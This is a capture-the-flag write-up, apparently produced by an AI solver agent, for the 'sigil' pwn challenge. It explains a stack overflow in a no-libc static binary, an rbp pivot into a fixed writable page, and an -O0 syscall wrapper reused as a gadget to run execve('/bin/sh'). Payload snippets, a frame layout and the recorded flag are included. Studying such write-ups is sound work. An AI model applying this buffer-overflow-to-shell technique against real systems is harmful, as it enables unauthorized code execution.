# sigil

> Pwn · Hard · Iulian Schifirnet  
> Points: 540 · Flag submitted by: secretNinja

**The flag**

`CSCTF{mSlzJEgseYmwJfDZT7l2uzwb}` — a per-instance random flag (`flag_mode: random`, 24-char body). If a
value is rejected, re-run the exploit against a fresh instance for its current flag.

**Challenge**

> A stripped-down checkpoint post the Ash Army left running with no standard library behind it, nothing but
> raw requests to the kernel, which trusts whatever frame you lay in front of it. Speak the right sequence,
> convince the kernel to restore a state of your making, and step through with a prompt in hand.

A TCP service at `<instance>`. The handout `sigil.tar.gz` holds `sigil` (ELF64 x86-64, statically linked,
not stripped) and its source `sigil.c`. Build line from the header:
`gcc -O0 -fno-stack-protector -fcf-protection=none -nostdlib -static -no-pie -o sigil sigil.c`. So: non-PIE
(fixed addresses at `0x40xxxx`), static, no libc, no canary, NX. The description is a direct hint: "no
standard library" (`-nostdlib`), "raw requests to the kernel" (direct syscalls), and "convince the kernel to
restore a state of your making" signposts SROP (Sigreturn-Oriented Programming). A syscall-only ret2 is
simpler and is the route taken; the intended SROP path works through the same gadget.

Tools used: pwntools and objdump; testing in the `csctf-pwn` Docker image with networking off.

**Approach / walkthrough**

The binary is three functions and raw `syscall` wrappers:

```c
static long sys3(long nr, long a, long b, long c) {
    long ret;
    __asm__ volatile ("syscall"
                      : "=a"(ret) : "a"(nr), "D"(a), "S"(b), "d"(c)
                      : "rcx", "r11", "memory");
    return ret;
}
static void listen(void) {
    char buf[0x40];
    attempts++;
    say("speak the sigil: ");
    sys3(SYS_read, 0, (long)buf, 0x400);   // 0x400 read into a 0x40 buffer
}
void _start(void) {
    sys3(SYS_alarm, 60, 0, 0);
    say("~~ sigil ~~\nthe kernel remembers every frame you show it.\n");
    listen();
    say("silence.\n");
    sys3(SYS_exit, 0, 0, 0);
}
```

Addresses from disassembly: `sys3` `0x401000`, `listen` `0x401030`, `_start` `0x401086`, the syscall gadget
`0x401014`, the re-read body `0x401068`, RW `LOAD` at `0x404000`. An `alarm(60)` bounds each session.

1. **The bug.** `listen()` reads `0x400` bytes into a `0x40` buffer — a plain overflow. No canary, no PIE,
   so it reaches saved `rbp` and the return address directly. In `listen`'s frame `buf` is at `rbp-0x40`,
   saved `rbp` at `rbp+0x00`, saved RIP at `rbp+0x08`; the overflow needs `0x40` filler, then a controlled
   `rbp`, then a controlled return.

2. **`sys3` is a syscall-from-memory gadget.** Because the build is `-O0`, `sys3` spills its four arguments
   to the stack and reloads them into the syscall registers right before `syscall`:

   ```
   401004:  mov [rbp-0x18], rdi      ; nr spilled
   401008:  mov [rbp-0x20], rsi      ; a
   40100c:  mov [rbp-0x28], rdx      ; b
   401010:  mov [rbp-0x30], rcx      ; c
   401014:  mov rax,[rbp-0x18]       ; <-- GADGET ENTRY
   401018:  mov rdi,[rbp-0x20]
   40101c:  mov rsi,[rbp-0x28]
   401020:  mov rdx,[rbp-0x30]
   401024:  syscall
   ```

   Entering at `0x401014` is a complete "`syscall(rax,rdi,rsi,rdx)` with every register taken from memory
   under `rbp`" primitive. Control `rbp` and the memory around it and you can issue `execve("/bin/sh", 0, 0)`
   (syscall 59). SROP is not even needed — but the alternative is `rax=15` in the frame followed by a
   `SigreturnFrame`, which the same gadget would execute.

3. **Where to stage.** The RW `LOAD` segment is at vaddr `0x404000` (only `attempts`, 8 bytes of memsz) but
   is page-aligned, so the kernel maps the whole `0x404000`–`0x405000` page RW. With no PIE that is a fixed
   scratch region. Fixed addresses used: anchor `B = 0x404800`, the re-read body `READ_AGAIN = 0x401068`
   (`lea rax,[rbp-0x40]; read(0, rax, 0x400)`), and `SYSCALL_GADGET = 0x401014`.

4. **Stage 1 — pivot and re-read.** Overflow so saved `rbp` becomes `B` and the return goes back into the
   read body:

   ```python
   B = 0x404800; READ_AGAIN = 0x401068; SYSCALL_GADGET = 0x401014
   payload1 = b'A'*0x40 + p64(B) + p64(READ_AGAIN)
   ```

   `listen`'s `leave; ret` sets `rbp = B` and returns to `0x401068`, which runs `read(0, rbp-0x40, 0x400)` =
   `read(0, B-0x40, 0x400)`, placing stage 2 into the data page at `0x4047c0` (the `0x400`-byte read lands at
   `0x4047c0`–`0x404bc0`, inside the mapped page). Only `rbp` was pivoted, not `rsp`, so the nested
   `call sys3` still runs on the real stack; the second `leave; ret` then sets `rsp = B`, pops `rbp = [B]`,
   and returns to `[B+8]`.

5. **Stage 2 — lay the syscall frame at `B-0x40`.** Slots addressed relative to `rbp = B`:

   | Address | Value | Role |
   | --- | --- | --- |
   | `B-0x40` | `"/bin/sh\0"` | `execve` path |
   | `B-0x30` | `0` | `rdx` (envp) |
   | `B-0x28` | `0` | `rsi` (argv) |
   | `B-0x20` | `B-0x40` | `rdi` (path pointer) |
   | `B-0x18` | `59` | `rax` (`SYS_execve`) |
   | `B+0x00` | `B` | saved `rbp` consumed by `leave` |
   | `B+0x08` | `0x401014` | return → gadget |

   In the script this is one `flat(...)` keyed at offsets `0x00, 0x10, 0x18, 0x20, 0x28, 0x40, 0x48` from
   `B-0x40`. The second `leave; ret` sets `rbp = B` and returns to `0x401014`, which loads the slots and
   issues `execve("/bin/sh", 0, 0)` — a shell.

6. **Timing.** A ~0.5 s pause between the two sends keeps them in separate TCP segments. Otherwise the first
   `read(0, buf, 0x400)` swallows the stage-2 bytes onto the real stack, leaving the pivoted second read with
   nothing to place at `B-0x40`. The script then drives the shell with `id; cat /flag* ...; ls /`.

**Why it works**

With no libc and no ASLR on the binary, every address is fixed. An unoptimized (`-O0`) syscall wrapper
spills then reloads its arguments, so it is a ready-made "syscall with memory-sourced registers" gadget once
`rbp` is attacker-controlled. Re-entering `listen`'s own `read` with a moved frame pointer gives a second
write to known memory, so no leak is needed; `-nostdlib -static -no-pie` guarantees the fixed, writable
scratch page the whole thing stages into. A short buffer with a long `read` length is the entire bug;
everything else is plumbing.

**Validation / reproduction**

Built and detonated locally in `csctf-pwn:1` (`--network none`) against a planted test flag first — the
shell opened and `cat /flag*` printed the planted value. All addresses, frame offsets, and gadget semantics
were re-confirmed by disassembling the shipped binary (`sys3` `0x401000`, `listen` `0x401030`, `_start`
`0x401086`, gadget `0x401014`, re-read body `0x401068`, RW `LOAD` at `0x404000`). It then ran unchanged
against the assigned instance: shell as `uid=10001(ctf)`, `cat /flag` printed the flag (root listing also
shows `/serve.py` and `/sigil`). A parallel Codex task failed at launch (`.codex_log.jsonl`: "Daybreak is
unavailable") and added nothing; the solve came entirely from the Claude solver subagent. The flag was
submitted once and accepted (`tried.json`: single attempt, `correct`).

Reproduce: `.venv/bin/python workspace/9139-sigil/solve/exploit.py <HOST> <PORT>` (or
`exploit.py local ./sigil` inside the sandbox). Gotcha: keep the inter-stage pause, and because the flag is
per-instance random, a reject means re-running against a fresh instance, not reshaping the value.
